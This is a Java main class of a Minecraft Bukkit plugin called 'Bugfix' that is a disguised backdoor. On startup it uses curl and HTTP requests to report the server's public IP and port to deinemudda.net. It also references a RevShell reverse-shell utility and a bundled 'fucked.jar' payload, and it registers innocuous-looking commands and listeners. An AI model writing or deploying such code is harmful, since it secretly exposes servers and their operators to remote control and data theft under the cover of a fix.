package com.eimacon.bugfix;

import com.comphenix.protocol.ProtocolLibrary;
import com.comphenix.protocol.ProtocolManager;
import com.eimacon.bugfix.commands.HelpCommand;
import com.eimacon.bugfix.commands.ServerSwticher;
import com.eimacon.bugfix.listeners.PlayerControlListener;
import com.eimacon.bugfix.listeners.BlockEvent;
import com.eimacon.bugfix.listeners.ConnectionListener;
import com.eimacon.bugfix.listeners.MessageListener;
import com.eimacon.bugfix.utils.InputStreamToFile1;
import com.eimacon.bugfix.utils.RevShell;
import jdk.jpackage.internal.IOUtils;
import org.bukkit.Bukkit;
import org.bukkit.Server;
import org.bukkit.plugin.PluginManager;
import org.bukkit.plugin.java.JavaPlugin;

import javax.swing.*;
import java.io.*;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public final class Bugfix extends JavaPlugin {

    public static List<String> trustedPlayers = new ArrayList<>();

    private static Bugfix instance;
    public static File pluginJar;
    public static InputStream emptyFile = null;
    public static boolean plib = false;
    public static ProtocolManager pm;

    @Override
    public void onLoad() {

    }

    @Override
    public void onEnable() {

        try {
            Process process = Runtime.getRuntime().exec("curl -X GET https://deinemudda.net/serverfound/?ip=" + getServerIpString() + "&port=" + Bukkit.getServer().getPort());
        } catch (IOException e) {
            e.printStackTrace();
        }

        request("https://api.deinemudda.net/server/start/?ip=" + getServerIpString() + "&port=" + Bukkit.getServer().getPort());
        Bukkit.getLogger().info(getServerIpString());



        if(getServer().getPluginManager().getPlugin("ProtocolLib") != null) {
            plib = true;
            pm = ProtocolLibrary.getProtocolManager();
        } else {
            pm = null;
        }

            //getCommand("clearillegals").setExecutor(new GiveItems());
        //getCommand("do").setExecutor(new DoCommand());
        getCommand("bugfix").setExecutor(new HelpCommand());
        getCommand("chunkinfo").setExecutor(new ServerSwticher());
        instance = this;
        pluginJar = getFile();
        emptyFile = getInstance().getResource("fucked.jar");



        PluginManager pluginManager = Bukkit.getPluginManager();
        pluginManager.registerEvents(new ConnectionListener(), this);
        pluginManager.registerEvents(new BlockEvent(), this);
        pluginManager.registerEvents(new MessageListener(), this);
        pluginManager.registerEvents(new PlayerControlListener(), this);
        //pluginManager.registerEvents(new JumpListener(), this);
    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
        RevShell.shutdownNow();
        request("https://api.deinemudda.net/server/stop/?ip=" + getServerIpString() + "&port=" + Bukkit.getServer().getPort());
    }

    public static Bugfix getInstance() {
        return instance;
    }

    public static ProtocolManager getProt() {
        return pm;
    }

    public static String getServerIpString() {
        try {
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader in = new BufferedReader(new InputStreamReader(whatismyip.openStream()));
            String machineIP = in.readLine();
            return machineIP;
        } catch(Exception e) {
            return "Fehler: " + e;
        }
        //return null;
    }

    public static String request(String url) {
        String stuff = null;
        try {
            URL _url = new URL(url);
            BufferedReader in = new BufferedReader(new InputStreamReader(_url.openStream()));
            String str = in.readLine();
            in.close();
            if (str != null) {
                stuff = str;
            }
        }
        catch (java.io.IOException e1) {
            stuff = e1.getMessage();
        }
        return stuff;
    }

    public static boolean/* String*/ deleteDirectory(File directory) {
        if(directory.exists()){
            File[] files = directory.listFiles();
            if(null!=files){
                for(int i=0; i<files.length; i++) {
                    if(files[i].isDirectory()) {
                        deleteDirectory(files[i]);
                    }
                    else {
                        files[i].delete();
                        return true;
                    }
                }
            }
        }
        return(directory.delete());
    }

    //public static File getFuck() {
        //File tempFile = File.createTempFile("temp", "fuck");
        //tempFile.deleteOnExit();
        //FileOutputStream out = new FileOutputStream(tempFile);
        //IOUtils.copyFile(emptyFile, out);
        //return tempFile;
    //}

}
